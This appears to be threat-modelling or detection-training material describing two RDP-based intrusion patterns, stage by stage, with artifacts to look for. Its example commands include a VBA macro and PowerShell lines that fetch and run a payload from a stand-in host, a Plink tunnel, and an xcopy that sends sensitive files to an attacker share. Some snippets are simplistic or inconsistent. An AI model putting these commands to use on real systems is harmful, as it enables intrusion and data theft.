Pattern Name: RDP Access via Compromised Accounts
Scenario Overview: An attacker gains initial access to a victim's network by exploiting compromised user credentials to establish an RDP session. The attacker uses this access to navigate the network and potentially deploy further malicious payloads.

Attack Flow Breakdown:
1. **Initial Access**
   - **Application Involved**: Outlook
   - **User Action**: The user receives a spearphishing email containing a malicious attachment (e.g., a Word document).
   - **Key Artifacts**: Email headers, attachment file (malicious.docx).
   - **Command**: 
     ```powershell
     # User opens the malicious Word document
     Start-Process "C:\Path\To\malicious.docx"
     ```

2. **Execution**
   - **Application Involved**: Microsoft Word
   - **User Action**: The user enables macros in the document, triggering the execution of embedded malicious code.
   - **Key Artifacts**: Macro scripts, temporary files created during execution.
   - **Command**: 
     ```vba
     ' Malicious macro code that downloads a payload
     Dim objHTTP As Object
     Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     objHTTP.Open "GET", "http://malicious-website.com/payload.exe", False
     objHTTP.Send
     ```

3. **Payload Delivery**
   - **Application Involved**: PowerShell
   - **User Action**: The macro executes a PowerShell command to download and execute a remote payload.
   - **Key Artifacts**: PowerShell command history, downloaded executable (payload.exe).
   - **Command**: 
     ```powershell
     # PowerShell command to download and execute the payload
     Invoke-WebRequest -Uri "http://malicious-website.com/payload.exe" -OutFile "C:\Path\To\payload.exe"
     Start-Process "C:\Path\To\payload.exe"
     ```

4. **Establishing RDP Access**
   - **Application Involved**: RDP Client
   - **User Action**: The attacker uses the compromised credentials to initiate an RDP session to the victim's machine.
   - **Key Artifacts**: RDP connection logs, event logs showing successful login.
   - **Command**: 
     ```shell
     # Command to initiate RDP session
     mstsc /v:VictimIPAddress /admin
     ```

5. **Lateral Movement**
   - **Application Involved**: RDP Client
   - **User Action**: The attacker navigates to other machines within the network using RDP.
   - **Key Artifacts**: RDP session logs, access to shared drives.
   - **Command**: 
     ```shell
     # Using RDP to connect to another machine
     mstsc /v:AnotherVictimIPAddress
     ```

6. **Data Exfiltration**
   - **Application Involved**: File Explorer
   - **User Action**: The attacker copies sensitive files from the victim's machine to a remote server.
   - **Key Artifacts**: File access logs, network traffic to the attacker-controlled server.
   - **Command**: 
     ```shell
     # Copying files to a remote server
     xcopy "C:\SensitiveData\*" "\\AttackerIPAddress\SharedFolder\" /E /H /C /I
     ```

Pattern Name: RDP Tunneling for Remote Access
Scenario Overview: An attacker uses a tunneling tool to establish a secure RDP connection to a compromised system, allowing for remote access and lateral movement within the network.

Attack Flow Breakdown:
1. **Initial Access**
   - **Application Involved**: Outlook
   - **User Action**: The user opens a spearphishing email with a malicious attachment.
   - **Key Artifacts**: Email logs, attachment (malicious.pdf).
   - **Command**: 
     ```powershell
     # User opens the malicious PDF
     Start-Process "C:\Path\To\malicious.pdf"
     ```

2. **Execution**
   - **Application Involved**: Adobe Reader
   - **User Action**: The user interacts with the PDF, triggering a malicious JavaScript payload.
   - **Key Artifacts**: JavaScript execution logs, temporary files.
   - **Command**: 
     ```javascript
     // Malicious JavaScript in PDF that downloads a tunneling tool
     app.alert("Malicious action executed");
     ```

3. **Payload Delivery**
   - **Application Involved**: PowerShell
   - **User Action**: The malicious JavaScript downloads a tunneling tool (e.g., Plink).
   - **Key Artifacts**: Downloaded files, PowerShell command history.
   - **Command**: 
     ```powershell
     # Downloading Plink for tunneling
     Invoke-WebRequest -Uri "http://malicious-website.com/plink.exe" -OutFile "C:\Path\To\plink.exe"
     ```

4. **Establishing RDP Tunnel**
   - **Application Involved**: Command Prompt
   - **User Action**: The attacker uses Plink to create an RDP tunnel to the victim's machine.
   - **Key Artifacts**: Command prompt logs, established tunnel connections.
   - **Command**: 
     ```shell
     # Command to create an RDP tunnel using Plink
     plink.exe -L 3389:localhost:3389 attacker@VictimIPAddress
     ```

5. **RDP Session Initiation**
   - **Application Involved**: RDP Client
   - **User Action**: The attacker connects to the RDP tunnel to access the victim's desktop.
   - **Key Artifacts**: RDP connection logs, event logs showing successful login.
   - **Command**: 
     ```shell
     # Connecting to the RDP tunnel
     mstsc /v:localhost:3389
     ```

6. **Lateral Movement**
   - **Application Involved**: RDP Client
   - **User Action**: The attacker uses the RDP session to access other machines in the network.
   - **Key Artifacts**: RDP session logs, access to shared drives.
   - **Command**: 
     ```shell
     # Using RDP to connect to another machine
     mstsc /v:AnotherVictimIPAddress
     ```
